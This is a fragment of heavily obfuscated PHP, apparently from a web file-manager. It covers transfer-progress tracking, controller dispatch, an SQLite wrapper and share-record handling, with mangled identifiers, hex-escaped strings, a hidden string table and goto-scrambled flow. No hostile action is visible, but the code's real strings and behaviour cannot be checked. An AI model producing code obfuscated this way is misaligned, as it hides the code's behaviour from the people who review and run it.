$eêÚ„¾Ø³”[$dÏ ©Ä¥á¡[1126]]; $eêÚ„¾Ø³”[$dÏ ©Ä¥á¡[1131]] += $eêÚ„¾Ø³”[$dÏ ©Ä¥á¡[1126]]; $eêÚ„¾Ø³”[$dÏ ©Ä¥á¡[1128]] = $dÏ ©Ä¥á¡[33]; $this->update(1); } public function updateFileEnd($F§†œ‚ ´›, $Añî†³ì) { $e«†¼ÉÌ×ğ =& $_SERVER[İåâé¾]; $bˆòï“ÕÁ¢ =& $this->task; $bˆòï“ÕÁ¢[$e«†¼ÉÌ×ğ[1124]] = $F§†œ‚ ´›; $bˆòï“ÕÁ¢[$e«†¼ÉÌ×ğ[1126]] = $Añî†³ì; $bˆòï“ÕÁ¢[$e«†¼ÉÌ×ğ[1131]] += $Añî†³ì; $this->update(1); } public function curlProgress($f“òğõÖË, $BàÈ–‚áå, $AÕõ“®“, $cØëÎÉ×Ç, $B—è¤Ï¢‹) { $dÒ¤œ¢œµÒ =& $_SERVER[İåâé¾]; $F‚¿ã‹¬Ô½ =& $this->task; if ($B—è¤Ï¢‹ > 0) { $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1087]] = $dÒ¤œ¢œµÒ[1135]; $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1128]] = $dÒ¤œ¢œµÒ[101]; if ($F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1126]] == $cØëÎÉ×Ç || $cØëÎÉ×Ç > 1024 * 1024) { $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1127]] = $B—è¤Ï¢‹; } if ($F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1129]]) { $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1127]] = $B—è¤Ï¢‹ + $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1129]]; } } else { if ($AÕõ“®“ > 0) { if ($F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1126]] == $BàÈ–‚áå) { $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1127]] = $AÕõ“®“; $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1087]] = $dÒ¤œ¢œµÒ[1136]; $F‚¿ã‹¬Ô½[$dÒ¤œ¢œµÒ[1128]] = $dÒ¤œ¢œµÒ[788]; } } } $this->update(); } public function curlProgressStart($cÌ± ¹‹’ì) { } public function curlProgressEnd($C½ôÜòê¦Œ) { $fèË´¯‚¿° =& $_SERVER[İåâé¾]; $a×ÊÅåÌ§ =& $this->task; $d¤ëï…øø× = curl_getinfo($C½ôÜòê¦Œ); $eˆŸÀƒ›¼İ = $d¤ëï…øø×[$fèË´¯‚¿°[1137]]; if ($a×ÊÅåÌ§[$fèË´¯‚¿°[1128]] == $fèË´¯‚¿°[101] && $eˆŸÀƒ›¼İ) { $a×ÊÅåÌ§[$fèË´¯‚¿°[1129]] += $eˆŸÀƒ›¼İ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $FÓÚìÜ“…” =& $_SERVER[İåâé¾]; $C³¦£ºÏö =& $this->task; Hook::bind($FÓÚìÜ“…”[1120], array($this, $FÓÚìÜ“…”[1138])); Hook::bind($FÓÚìÜ“…”[1118], array($this, $FÓÚìÜ“…”[1139])); Hook::bind($FÓÚìÜ“…”[1122], array($this, $FÓÚìÜ“…”[1140])); } protected function endAfter() { $aÈëñ›È =& $_SERVER[İåâé¾]; Hook::unbind($aÈëñ›È[1120], array($this, $aÈëñ›È[1138])); } public function progressStart($e‡©¨Şøå¤) { $B¬Šà”×† =& $_SERVER[İåâé¾]; $fË¤ÊÉ¡ßä = curl_getinfo($e‡©¨Şøå¤); self::log($B¬Šà”×†[1141] . $fË¤ÊÉ¡ßä[$B¬Šà”×†[298]]); self::valueSet($this->task[$B¬Šà”×†[368]], $this->task); } public function progressEnd($BßÕÊ»«©) { $BõÒËõˆ×å =& $_SERVER[İåâé¾]; self::log($BõÒËõˆ×å[1142] . $this->task[$BõÒËõˆ×å[368]]); $this->end(); } public function progress($E¼ôë§Üƒ±, $bá¨“İãï, $EùÅÈ Öì‚, $FÍ‰¯÷Ü¿­, $B­¯Ş†àÌÖ) { $c¡§™šö¡ =& $_SERVER[İåâé¾]; $b†Ó¿Šâî½ =& $this->task; if ($B­¯Ş†àÌÖ > 0) { $b†Ó¿Šâî½[$c¡§™šö¡[1088]] = $b†Ó¿Šâî½[$c¡§™šö¡[1088]] == 0 ? $FÍ‰¯÷Ü¿­ : $b†Ó¿Šâî½[$c¡§™šö¡[1088]]; $b†Ó¿Šâî½[$c¡§™šö¡[1089]] = $B­¯Ş†àÌÖ; } else { if ($EùÅÈ Öì‚ > 0) { $b†Ó¿Šâî½[$c¡§™šö¡[1088]] = $b†Ó¿Šâî½[$c¡§™šö¡[1088]] == 0 ? $bá¨“İãï : $b†Ó¿Šâî½[$c¡§™šö¡[1088]]; $b†Ó¿Šâî½[$c¡§™šö¡[1089]] = $EùÅÈ Öì‚; } } $this->update(); self::log("\x70\162\157\147\x72\145\163\x73\110\x74\x74\160\72\x64\157\x77\x6e\x3a{$EùÅÈ Öì‚}\x2f{$bá¨“İãï}\x3b\40\165\x70\154\157\x61\x64\72{$B­¯Ş†àÌÖ}\57{$FÍ‰¯÷Ü¿­}\x3b"); } } goto B¿œ‰”½‰; bƒ¶¿Ò˜‰î: class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($côÅª‡ôÆ’, $bñêàÔ†×) { $Dµ•±Òš•Î =& $_SERVER[İåâé¾]; if (isset(self::$_methodList[$côÅª‡ôÆ’])) { return @call_user_func_array(self::$_methodList[$côÅª‡ôÆ’], $bñêàÔ†×); } else { if (method_exists($this, $côÅª‡ôÆ’)) { return call_user_func_array(array($this, $côÅª‡ôÆ’), $bñêàÔ†×); } else { think_exception(__CLASS__ . $Dµ•±Òš•Î[4] . $côÅª‡ôÆ’ . $Dµ•±Òš•Î[5]); } } } public static function __callStatic($C•«âÙƒ¯£, $BôÆÔŠ°ø) { if (isset(self::$_methodListStatic[$C•«âÙƒ¯£])) { return call_user_func_array(self::$_methodListStatic[$C•«âÙƒ¯£], $BôÆÔŠ°ø); } else { if (method_exists(self, $C•«âÙƒ¯£)) { return call_user_func_array(array(self, $C•«âÙƒ¯£), $BôÆÔŠ°ø); } else { show_json("{$C•«âÙƒ¯£}\x28\x29\40\156\x6f\164\40\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($fÙ»„×çŞŠ, $EÅŞ˜Ö¾É) { self::$_methodList[$fÙ»„×çŞŠ] = $EÅŞ˜Ö¾É; } public static function addMethodStatic($b²ùêÁ”¦ì, $c­Åòİ¤àÅ) { self::$_methodListStatic[$b²ùêÁ”¦ì] = $c­Åòİ¤àÅ; } } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto fÚ›¹œ±ö; bƒÁºƒÙòÂ: $this->tpl = TEMPLATE . MOD . $f¹°Ô‰‰Á[8]; $this->_classObjectID = mt_rand(0, 10000); goto fö‡¼¾‚İ¬; AÖïË¼ÊÒÈ: $this->in =& $in; $this->values[$f¹°Ô‰‰Á[6]] =& $config; $this->values[$f¹°Ô‰‰Á[7]] =& $in; goto bƒÁºƒÙòÂ; fÚ›¹œ±ö: $f¹°Ô‰‰Á =& $_SERVER[İåâé¾]; global $in, $config; $this->config =& $config; goto AÖïË¼ÊÒÈ; fö‡¼¾‚İ¬: } public function loadClass($EÁ–ôŸË²˜) { if (1 === func_num_args()) { $this->{$EÁ–ôŸË²˜} = new $EÁ–ôŸË²˜(); } else { $d¢°¦ÙÙ•Á = new ReflectionClass($EÁ–ôŸË²˜); $d•ËŒÂ¼ÀÂ = func_get_args(); array_shift($d•ËŒÂ¼ÀÂ); $this->{$EÁ–ôŸË²˜} = $d¢°¦ÙÙ•Á->newInstanceArgs($d•ËŒÂ¼ÀÂ); } return $this->{$EÁ–ôŸË²˜}; } protected function assign($c´ƒ‡¡•, $EŒÅîÍÔäÙ) { $this->values[$c´ƒ‡¡•] = $EŒÅîÍÔäÙ; } protected function display($bºî‚âÆĞ) { ob_end_clean(); extract($this->values); require $this->tpl . $bºî‚âÆĞ; } } class DbSqliteBase extends Db { public function __construct($aÛÌ–®Úö = '') { $aÛÔ°â×ƒõ =& $_SERVER[İåâé¾]; if (!extension_loaded($aÛÔ°â×ƒõ[9])) { think_exception(think_lang($aÛÔ°â×ƒõ[10]) . $aÛÔ°â×ƒõ[11]); } if (!empty($aÛÌ–®Úö)) { if (!isset($aÛÌ–®Úö[$aÛÔ°â×ƒõ[12]])) { $aÛÌ–®Úö[$aÛÔ°â×ƒõ[12]] = 438; } $this->config = $aÛÌ–®Úö; if (empty($this->config[$aÛÔ°â×ƒõ[13]])) { $this->config[$aÛÔ°â×ƒõ[13]] = array(); } } } public function connect($f¨ëìù«ÚÙ = '', $FØ¥À¯ğĞÒ = 0) { $eô´¡˜ª›é =& $_SERVER[İåâé¾]; if (!isset($this->linkID[$FØ¥À¯ğĞÒ])) { goto bÕÙ¿›¹; Cô¥ØË¯’£: $this->linkID[$FØ¥À¯ğĞÒ] = $C¬±„éÚŒ($f¨ëìù«ÚÙ[$eô´¡˜ª›é[17]], $f¨ëìù«ÚÙ[$eô´¡˜ª›é[12]]); if (!$this->linkID[$FØ¥À¯ğĞÒ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto CÄïï»Œ‰; CÄïï»Œ‰: @sqlite_busy_timeout($this->linkID[$FØ¥À¯ğĞÒ], 30000); if (1 != think_config($eô´¡˜ª›é[18])) { unset($this->config); } goto eŸïÔÁ¾¤; bÕÙ¿›¹: if (empty($f¨ëìù«ÚÙ)) { $f¨ëìù«ÚÙ = $this->config; } $BğŞÇ£Ëù¦ = !empty($f¨ëìù«ÚÙ[$eô´¡˜ª›é[13]][$eô´¡˜ª›é[14]]) ? $f¨ëìù«ÚÙ[$eô´¡˜ª›é[13]][$eô´¡˜ª›é[14]] : $this->pconnect; $C¬±„éÚŒ = $BğŞÇ£Ëù¦ ? $eô´¡˜ª›é[15] : $eô´¡˜ª›é[16]; goto Cô¥ØË¯’£; eŸïÔÁ¾¤: } return $this->linkID[$FØ¥À¯ğĞÒ]; } public function free() { $this->queryID = null; } public function query($CÇèôÜšáé) { goto C°¥Áõš¿¹; C°¥Áõš¿¹: $Eƒ„²ô‡¿ =& $_SERVER[İåâé¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AÏÆí¦óÙ™; aÉéÓ†ÅÆ: think_status($Eƒ„²ô‡¿[20]); $this->queryID = sqlite_query($this->_linkID, $CÇèôÜšáé); $this->debug(); goto F®”¬‰œÄ; AÏÆí¦óÙ™: $this->queryStr = $CÇèôÜšáé; if ($this->queryID) { $this->free(); } think_action_status($Eƒ„²ô‡¿[19], 1); goto aÉéÓ†ÅÆ; F®”¬‰œÄ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $A§®¨‘Ê¢ = $this->getAll(); return $A§®¨‘Ê¢; } goto eœÎ¢ŞœŞæ; eœÎ¢ŞœŞæ: } public function execute($e”ÜßÒİÂÓ) { goto d±Ø•ÚØ‚; d±Ø•ÚØ‚: $d¦ØÙ¨ƒ„ =& $_SERVER[İåâé¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÊƒò´Í‡; aŠõÑ¿´ö×: think_status($d¦ØÙ¨ƒ„[20]); $aç´ÒÒï†Ñ = sqlite_exec($this->_linkID, $e”ÜßÒİÂÓ); $this->debug(); goto EØ˜¯ƒ­ï; EØ˜¯ƒ­ï: if (!1 === $aç´ÒÒï†Ñ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto BÂ“­Æï¼; CÊƒò´Í‡: $this->queryStr = $e”ÜßÒİÂÓ; if ($this->queryID) { $this->free(); } think_action_status($d¦ØÙ¨ƒ„[21], 1); goto aŠõÑ¿´ö×; BÂ“­Æï¼: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[İåâé¾][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E›î‚Ñ··Ì = sqlite_query($this->_linkID, $_SERVER[İåâé¾][23]); if (!$E›î‚Ñ··Ì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D•˜ãÕ«ÄÖ = sqlite_query($this->_linkID, $_SERVER[İåâé¾][24]); if (!$D•˜ãÕ«ÄÖ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C¡„ÂÇ±®¥ = array(); if ($this->numRows > 0) { for ($F©»”ßÁ„„ = 0; $F©»”ßÁ„„ < $this->numRows; $F©»”ßÁ„„++) { $C¡„ÂÇ±®¥[$F©»”ßÁ„„] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $C¡„ÂÇ±®¥; } public function getFields($bŞÀ¯š£õ) { $a­‰½£Ïô =& $_SERVER[İåâé¾]; $E®¬è°ê©Õ = $this->query($a­‰½£Ïô[25] . $bŞÀ¯š£õ . $a­‰½£Ïô[26]); $FéøÈÀ½º = array(); if ($E®¬è°ê©Õ) { foreach ($E®¬è°ê©Õ as $dºÆÍ‹…µ… => $dŞØÅ£¿Ø÷) { $FéøÈÀ½º[$dŞØÅ£¿Ø÷[$a­‰½£Ïô[27]]] = array($a­‰½£Ïô[28] => $dŞØÅ£¿Ø÷[$a­‰½£Ïô[27]], $a­‰½£Ïô[29] => $dŞØÅ£¿Ø÷[$a­‰½£Ïô[30]], $a­‰½£Ïô[31] => (bool) ($dŞØÅ£¿Ø÷[$a­‰½£Ïô[32]] === $a­‰½£Ïô[33]), $a­‰½£Ïô[34] => $dŞØÅ£¿Ø÷[$a­‰½£Ïô[35]], $a­‰½£Ïô[36] => strtolower($dŞØÅ£¿Ø÷[$a­‰½£Ïô[37]]) == $a­‰½£Ïô[38], $a­‰½£Ïô[39] => strtolower($dŞØÅ£¿Ø÷[$a­‰½£Ïô[40]]) == $a­‰½£Ïô[41]); } } return $FéøÈÀ½º; } public function getTables($eÜôŸÇŞ‚Ã = '') { $D­ƒçáÙ¦© =& $_SERVER[İåâé¾]; $a¡ßÈ¯âÎË = $this->query($D­ƒçáÙ¦©[42] . $D­ƒçáÙ¦©[43] . $D­ƒçáÙ¦©[44]); $BºÛ‹½¸ì = array(); foreach ($a¡ßÈ¯âÎË as $A–îÍÄñÙÕ => $DîÇ¡¤ĞÇ) { $BºÛ‹½¸ì[$A–îÍÄñÙÕ] = current($DîÇ¡¤ĞÇ); } return $BºÛ‹½¸ì; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $a‹­”Á¡Ú… =& $_SERVER[İåâé¾]; $D“ˆä¥œ®Û = sqlite_last_error($this->_linkID); $this->error = $D“ˆä¥œ®Û . $a‹­”Á¡Ú…[4] . sqlite_error_string($D“ˆä¥œ®Û); if ($a‹­”Á¡Ú…[33] != $this->queryStr) { $this->error .= LNG($a‹­”Á¡Ú…[45]) . $this->queryStr; } think_trace($this->error, $a‹­”Á¡Ú…[33], $a‹­”Á¡Ú…[46]); return $this->error; } public function escapeString($Eê‹‰•ö) { return sqlite_escape_string($Eê‹‰•ö); } public function parseLimit($BÀ¸ƒã©¶) { $dÆï¤»“Ö =& $_SERVER[İåâé¾]; $F˜ÁØŠ‰ = $dÆï¤»“Ö[33]; if (!empty($BÀ¸ƒã©¶)) { $BÀ¸ƒã©¶ = explode($dÆï¤»“Ö[47], $BÀ¸ƒã©¶); if (count($BÀ¸ƒã©¶) > 1) { $F˜ÁØŠ‰ .= $dÆï¤»“Ö[48] . $BÀ¸ƒã©¶[1] . $dÆï¤»“Ö[49] . $BÀ¸ƒã©¶[0] . $dÆï¤»“Ö[50]; } else { $F˜ÁØŠ‰ .= $dÆï¤»“Ö[48] . $BÀ¸ƒã©¶[0] . $dÆï¤»“Ö[50]; } } return $F˜ÁØŠ‰; } } goto bÄĞ¹¡âÙ…; D¹Î¦ô†¿ä: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\x54\151\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\162\x74\54\x75\160\x64\141\164\145", "\x66\x75\x6e\x63\164\151\157\156"), array("\143\162\145\141\164\145\124\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\145\162\164", "\x66\x75\156\143\x74\x69\x6f\x6e"), array("\x6f\x70\x74\151\157\x6e\163", '', "\151\156\x73\x65\162\164\54\x75\160\x64\141\164\145\54\x73\145\x6c\145\143\164", "\x6a\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Cµâ¿±õºì) { $A–Õƒ¤Ùô =& $_SERVER[İåâé¾]; $e°„¼ÚÁ™  = isset($Cµâ¿±õºì[0]) ? $Cµâ¿±õºì[0] : !1; return array($A–Õƒ¤Ùô[1654] => array(USER_ID, $A–Õƒ¤Ùô[1655]), $A–Õƒ¤Ùô[1620] => array($e°„¼ÚÁ™ , $A–Õƒ¤Ùô[1656])); } protected function listSimple() { $CŠğê’ã¨ = array($_SERVER[İåâé¾][1086] => USER_ID); $BïÜÑ¸Ò±á = $this->field($this->fieldList)->where($CŠğê’ã¨)->select(); return $BïÜÑ¸Ò±á ? $BïÜÑ¸Ò±á : array(); } protected function getInfo($eˆŞŠ‹“ÇŞ, $cøî‚ºÍÚ„ = false) { $e§¢ˆÛÚ«Ö =& $_SERVER[İåâé¾]; if ($cøî‚ºÍÚ„) { return $this->_getShareInfo(array($e§¢ˆÛÚ«Ö[419] => $eˆŞŠ‹“ÇŞ)); } $b–ÙøéêÇ• = $this->cacheFunctionGet($e§¢ˆÛÚ«Ö[1657], $eˆŞŠ‹“ÇŞ); return $b–ÙøéêÇ•; } public function getInfoByHash($d¦ÁÓ½Ñ) { return $this->_getShareInfo(array($_SERVER[İåâé¾][1658] => $d¦ÁÓ½Ñ)); } public function getInfoByPath($EÀøªÂ›¿‚) { $BÃîÊªõ‚ =& $_SERVER[İåâé¾]; $f–—±Âùæİ = array($BÃîÊªõ‚[1086] => USER_ID, $BÃîÊªõ‚[374] => $EÀøªÂ›¿‚); return $this->_getShareInfo($f–—±Âùæİ); } public function getInfoBySourcePath($AïÙ›á›§) { $a©É­ê…ó™ =& $_SERVER[İåâé¾]; $a£á×Åì¦Î = array($a©É­ê…ó™[1086] => USER_ID, $a©É­ê…ó™[763] => $AïÙ›á›§); return $this->_getShareInfo($a£á×Åì¦Î); } private function _getShareInfo($B¯µÔ–ğ»Ë) { goto fñ™ˆæÇ‘Ã; fñ™ˆæÇ‘Ã: $a³¢Ñ•áº =& $_SERVER[İåâé¾]; $A¼ïñ‚³ìÏ = $this->where($B¯µÔ–ğ»Ë)->find(); if (!$A¼ïñ‚³ìÏ) { return !1; } goto CöÏ’·¹Á; Bíœ‡¤¯Ú: if ($A¼ïñ‚³ìÏ[$a³¢Ñ•áº[374]] == $a³¢Ñ•áº[402]) { $A¼ïñ‚³ìÏ[$a³¢Ñ•áº[856]] = IO::info($A¼ïñ‚³ìÏ[$a³¢Ñ•áº[763]]); } else { $A¼ïñ‚³ìÏ[$a³¢Ñ•áº[856]] = Model($a³¢Ñ•áº[850])->pathInfo($A¼ïñ‚³ìÏ[$a³¢Ñ•áº[374]]); } $A¼ïñ‚³ìÏ[$a³¢Ñ•áº[1660]] = $b±åø³‡±; return $A¼ïñ‚³ìÏ; goto Dí×àßÙª‹; CöÏ’·¹Á: $B¯µÔ–ğ»Ë = array($a³¢Ñ•áº[419] => $A¼ïñ‚³ìÏ[$a³¢Ñ•áº[419]]); $aÂ¤¤©§ = $a³¢Ñ•áº[1659]; $b±åø³‡± = Model($a³¢Ñ•áº[420])->order($a³¢Ñ•áº[368])->field($aÂ¤¤©§)->where($B¯µÔ–ğ»Ë)->select(); goto Bíœ‡¤¯Ú; Dí×àßÙª‹: } protected function getInfoAuth($Cá«»¼ËôÓ) { $a‡ÖåÍ„¹± =& $_SERVER[İåâé¾]; $Eê¢‚„Î¡™ = $this->getInfo($Cá«»¼ËôÓ); $Eê¢‚„Î¡™[$a‡ÖåÍ„¹±[549]] = Model($a‡ÖåÍ„¹±[413])->authMake($Eê¢‚„Î¡™[$a‡ÖåÍ„¹±[1660]]); return $Eê¢‚„Î¡™; } protected function listData($d‘öÀÛÄ = null, $D×ËÚ‡¬Ï = 300) { $BÁ² Ÿß¾ğ =& $_SERVER[İåâé¾]; $F´£‡÷ï§ = array(array($BÁ² Ÿß¾ğ[1661] => array($BÁ² Ÿß¾ğ[692], 0), $BÁ² Ÿß¾ğ[417] => array($BÁ² Ÿß¾ğ[692], 0), $BÁ² Ÿß¾ğ[1662] => $BÁ² Ÿß¾ğ[1635])); if ($d‘öÀÛÄ == 1) { $F´£‡÷ï§ = array($BÁ² Ÿß¾ğ[1661] => 1); } else { if ($d‘öÀÛÄ == 2) { $F´£‡÷ï§ = array($BÁ² Ÿß¾ğ[417] => 1); } } $F´£‡÷ï§[$BÁ² Ÿß¾ğ[1086]] = USER_ID; $eÁòÈˆ³Ô¶ = $this->where($F´£‡÷ï§)->selectPage($D×ËÚ‡¬Ï); return $eÁòÈˆ³Ô¶; } protected function listToMe($C—Šõíâ™ = 300) { goto fÉÚ”•Ù; dÁğ‹“õóÎ: $FÅáñà•°î = array($a¦„¤Ñ‰ã¬[419] => array($a¦„¤Ñ‰ã¬[1642], array_keys($A‘•Ëô÷¦Â))); $c”ì‚´‚¸× = $this->field($b›ÀÖæÑ½)->where($FÅáñà•°î)->select(); foreach ($c”ì‚´‚¸× as $cèáà «¼Õ => &$e­´µ¬—¤) { $e­´µ¬—¤[$a¦„¤Ñ‰ã¬[1660]] = $A‘•Ëô÷¦Â[$e­´µ¬—¤[$a¦„¤Ñ‰ã¬[419]]]; } goto b×™Õ²—Õ¤; A¥ãÆ›ôµ: $FÅáñà•°î = array($a¦„¤Ñ‰ã¬[392] => SourceModel::TYPE_USER, $a¦„¤Ñ‰ã¬[395] => USER_ID); if ($B™¼µîë…«) { $FÅáñà•°î = array(array($a¦„¤Ñ‰ã¬[392] => SourceModel::TYPE_USER, $a¦„¤Ñ‰ã¬[395] => USER_ID), array($a¦„¤Ñ‰ã¬[392] => SourceModel::TYPE_GROUP, $a¦„¤Ñ‰ã¬[395] => array($a¦„¤Ñ‰ã¬[7], $B™¼µîë…«)), $a¦„¤Ñ‰ã¬[1662] => $a¦„¤Ñ‰ã¬[1635]); } $fÜÁÃãœï = Model($a¦„¤Ñ‰ã¬[420])->where($FÅáñà•°î)->selectPage($C—Šõíâ™); goto CãÃÚ­­œ; CãÃÚ­­œ: $A‘•Ëô÷¦Â = array_to_keyvalue_group($fÜÁÃãœï[$a¦„¤Ñ‰ã¬[356]], $a¦„¤Ñ‰ã¬[419]); if (!$A‘•Ëô÷¦Â) { return $fÜÁÃãœï; } $b›ÀÖæÑ½ = $a¦„¤Ñ‰ã¬[1664]; goto dÁğ‹“õóÎ; fÉÚ”•Ù: $a¦„¤Ñ‰ã¬ =& $_SERVER[İåâé¾]; $E×¿ì§¶™ = Session::get($a¦„¤Ñ‰ã¬[1663]); $B™¼µîë…« = array_to_keyvalue($E×¿ì§¶™, $a¦„¤Ñ‰ã¬[33], $a¦„¤Ñ‰ã¬[1542]); goto A¥ãÆ›ôµ; b×™Õ²—Õ¤: $CÇàºöÌ‘¢ = array($a¦„¤Ñ‰ã¬[1665] => $c”ì‚´‚¸×, $a¦„¤Ñ‰ã¬[1666] => $fÜÁÃãœï[$a¦„¤Ñ‰ã¬[353]]); return $CÇàºöÌ‘¢; goto aô„ò¤—‚Í; aô„ò¤—‚Í: } protected function shareAdd($f„‚œˆà‚¢, $AÀÜğ—¨ŞŸ) { $bø…ÈÈ£Ì¹ =& $_SERVER[İåâé¾]; $e»¼Ê‹šŞ = $this->_addShareData($f„‚œˆà‚¢, $AÀÜğ—¨ŞŸ); if (isset($AÀÜğ—¨ŞŸ[$bø…ÈÈ£Ì¹[1667]]) && count($AÀÜğ—¨ŞŸ[$bø…ÈÈ£Ì¹[1667]]) > 0) { $this->_shareAuthSet($e»¼Ê‹šŞ, $AÀÜğ—¨ŞŸ[$bø…ÈÈ£Ì¹[1667]]); } $this->shareEventAdd($f„‚œˆà‚¢, $AÀÜğ—¨ŞŸ, $bø…ÈÈ£Ì¹[755]); return $e»¼Ê‹šŞ; } private function shareEventAdd($FŸ‚—¦‹¿, $f›×õËÁê¶, $b¡¿§©ÊãÒ = "\141\144\144") { goto B™¸•›ƒ‚Œ; B™¸•›ƒ‚Œ: $D¨èŠ‚Á¢º =& $_SERVER[İåâé¾]; if ($b¡¿§©ÊãÒ == $D¨èŠ‚Á¢º[755]) { if ($f›×õËÁê¶[$D¨èŠ‚Á¢º[1661]] == $D¨èŠ‚Á¢º[376]) { Model($D¨èŠ‚Á¢º[381])->eventShare($FŸ‚—¦‹¿, $D¨èŠ‚Á¢º[1668]); } if ($f›×õËÁê¶[$D¨èŠ‚Á¢º[417]] == $D¨èŠ‚Á¢º[376]) { Model($D¨èŠ‚Á¢º[381])->eventShare($FŸ‚—¦‹¿, $D¨èŠ‚Á¢º[1669]); } return; } $DÊåï¤¦Ë÷ = $this->getInfoByPath($FŸ‚—¦‹¿); goto Fˆ˜ïçéË; D½ùóĞÔË: return; goto EøÍÕ¦‡àì; Fˆ˜ïçéË: $cš§¯Ûç = $D¨èŠ‚Á¢º[1670]; if ($DÊåï¤¦Ë÷[$D¨èŠ‚Á¢º[1661]] == $D¨èŠ‚Á¢º[402] && $f›×õËÁê¶[$D¨èŠ‚Á¢º[1661]] == $D¨èŠ‚Á¢º[376]) { $cš§¯Ûç = $D¨èŠ‚Á¢º[1668]; } if ($DÊåï¤¦Ë÷[$D¨èŠ‚Á¢º[1661]] == $D¨èŠ‚Á¢º[376] && $f›×õËÁê¶[$D¨èŠ‚Á¢º[1661]] == $D¨èŠ‚Á¢º[402]) { $cš§¯Ûç = $D¨èŠ‚Á¢º[1671]; } goto B÷ù”…”Ü; B÷ù”…”Ü: if ($DÊåï¤¦Ë÷[$D¨èŠ‚Á¢º[417]] == $D¨èŠ‚Á¢º[402] && $f›×õËÁê¶[$D¨èŠ‚Á¢º[417]] == $D¨èŠ‚Á¢º[376]) { $cš§¯Ûç = $D¨èŠ‚Á¢º[1669]; } if ($DÊåï¤¦Ë÷[$D¨èŠ‚Á¢º[417]] == $D¨èŠ‚Á¢º[376] && $f›×õËÁê¶[$D¨èŠ‚Á¢º[417]] == $D¨èŠ‚Á¢º[402]) { $cš§¯Ûç = $D¨èŠ‚Á¢º[1672]; } Model($D¨èŠ‚Á¢º[381])->eventShare($FŸ‚—¦‹¿, $cš§¯Ûç); goto D½ùóĞÔË; EøÍÕ¦‡àì: } private function _addShareData($CÏôòã¯, $B„÷ç´çà = array()) { goto E‡óòÉ×§ì; CùÛğè’: if ($c‘º‹º–ˆ = $this->where($F†ƒƒÕø¼)->find()) { return $c‘º‹º–ˆ[$bèÏÛƒªï¡[419]]; } if ($CÏôòã¯ == 0) { $aÔØ¯ÃÔº = array($bèÏÛƒªï¡[28] => get_path_this($B„÷ç´çà[$bèÏÛƒªï¡[76]])); } else { $aÔØ¯ÃÔº = Model($bèÏÛƒªï¡[521])->sourceInfo($CÏôòã¯); if (!$aÔØ¯ÃÔº) { return !1; } } if (!$B„÷ç´çà[$bèÏÛƒªï¡[996]]) { $B„÷ç´çà[$bèÏÛƒªï¡[996]] = $aÔØ¯ÃÔº[$bèÏÛƒªï¡[28]]; } goto c¿¹Ñ¼«òŒ; c¿¹Ñ¼«òŒ: $bÒšù‘¬¡ê = array($bèÏÛƒªï¡[1077] => USER_ID, $bèÏÛƒªï¡[415] => $CÏôòã¯, $bèÏÛƒªï¡[996] => $bèÏÛƒªï¡[33], $bèÏÛƒªï¡[1661] => 0, $bèÏÛƒªï¡[417] => 0, $bèÏÛƒªï¡[763] => $bèÏÛƒªï¡[33], $bèÏÛƒªï¡[567] => $bèÏÛƒªï¡[33], $bèÏÛƒªï¡[1674] => 0, $bèÏÛƒªï¡[1675] => 0, $bèÏÛƒªï¡[460] => 0, $bèÏÛƒªï¡[1676] => $bèÏÛƒªï¡[33], $bèÏÛƒªï¡[1658] => $bèÏÛƒªï¡[33]); $EšÇÌƒÁ = explode($bèÏÛƒªï¡[47], $bèÏÛƒªï¡[1677]); foreach ($EšÇÌƒÁ as $cãÁßùö¿¼) { $bÒšù‘¬¡ê[$cãÁßùö¿¼] = $B„÷ç´çà[$cãÁßùö¿¼]; } goto f¿â‰ÃÉì; f¿â‰ÃÉì: $a„¡öä×¿Ó = $this->add($bÒšù‘¬¡ê); $D·†êÂğµ = array($bèÏÛƒªï¡[1658] => short_id($a„¡öä×¿Ó)); $this->where(array($bèÏÛƒªï¡[1678] => $a„¡öä×¿Ó))->save($D·†êÂğµ); goto fÑ³äˆİ©µ; E‡óòÉ×§ì: $bèÏÛƒªï¡ =& $_SERVER[İåâé¾]; $F†ƒƒÕø¼ = array($bèÏÛƒªï¡[415] => $CÏôòã¯, $bèÏÛƒªï¡[1077] => USER_ID); if ($CÏôòã¯ == 0) { $F†ƒƒÕø¼ = array($bèÏÛƒªï¡[1673] => $B„÷ç´çà[$bèÏÛƒªï¡[763]], $bèÏÛƒªï¡[1077] => USER_ID); } goto CùÛğè’; fÑ³äˆİ©µ: return $a„¡öä×¿Ó; goto 